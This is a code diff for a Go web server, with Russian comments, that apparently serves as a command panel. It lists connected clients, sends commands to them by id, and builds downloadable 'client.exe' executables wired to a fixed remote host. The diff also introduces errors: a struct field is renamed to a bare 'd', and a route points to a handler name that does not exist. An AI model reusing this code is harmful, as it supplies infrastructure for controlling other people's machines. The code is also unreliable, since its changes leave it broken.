@@ -36,7 +36,7 @@ type Build struct {
 	ID      string
 	Owner   string
 	Host    string
-	Created time.Time
+	d time.Time
 }
 
 var (
@@ -66,7 +66,7 @@ func main() {
 	r.Handle("/clients", authMiddleware(http.HandlerFunc(getClientsHandler))).Methods("GET")
 	r.Handle("/send/{id}", authMiddleware(http.HandlerFunc(sendCommandHandler))).Methods("POST")
 	r.Handle("/apps/{file}", http.StripPrefix("/apps/", http.FileServer(http.Dir("./apps"))))
-	r.Handle("/builds", authMiddleware(http.HandlerFunc(createBuildHandler))).Methods("POST")
+	r.Handle("/builds", authMiddleware(http.HandlerFunc(BuildHandler))).Methods("POST")
 	r.Handle("/builds", authMiddleware(http.HandlerFunc(listBuildsHandler))).Methods("GET")
 	r.Handle("/builds/{id}", authMiddleware(http.HandlerFunc(downloadBuildHandler))).Methods("GET")
 	r.HandleFunc("/ws", wsHandler)
@@ -119,22 +119,23 @@ func createBuildHandler(w http.ResponseWriter, r *http.Request) {
 	userBuildsMu.Unlock()
 
 	// Вызываем builder для создания клиента
-	exePath, err := builder.Build("panel-agzz.onrender.com", buildID)
-	if err != nil {
+	if err := builder.Build("panel-agzz.onrender.com", buildID); err != nil {
 		log.Printf("Build error: %v", err)
 		w.Header().Set("Content-Type", "application/json")
 		w.WriteHeader(http.StatusInternalServerError)
 		json.NewEncoder(w).Encode(map[string]string{
-		    "error": err.Error(),
-	})
-	return
+			"error": err.Error(),
+		})
+		return
 	}
 
-	// Возвращаем ID билда
+	exePath := filepath.Join("builds", buildID, "client.exe")
+	
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(map[string]string{
-		"status":  "success",
-		"exePath": exePath,
+		"status": "success",
+		"buildID": buildID,
+		"path": exePath, // Добавляем путь в ответ
 	})
 }
 
